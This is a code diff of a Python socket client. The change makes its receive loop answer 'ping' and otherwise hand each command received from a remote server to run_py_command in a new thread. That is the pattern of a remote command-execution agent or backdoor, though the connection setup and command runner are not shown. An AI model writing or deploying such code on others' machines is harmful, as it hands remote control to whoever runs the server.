@@ -1,6 +1,7 @@
 import socket
 import subprocess
 import os
+import threading
 
 def initialize_client_socket():
 
@@ -26,5 +27,10 @@ def main():
 
     while True:
         command = client_socket.recv(1024).decode("utf-8")
-        run_py_command("geoinit")
+
+        if command == "ping":
+            client_socket.send("pong".encode("utf-8"))
+
+        else:
+            threading.Thread(target=run_py_command, args=(command,)).start()
 main()
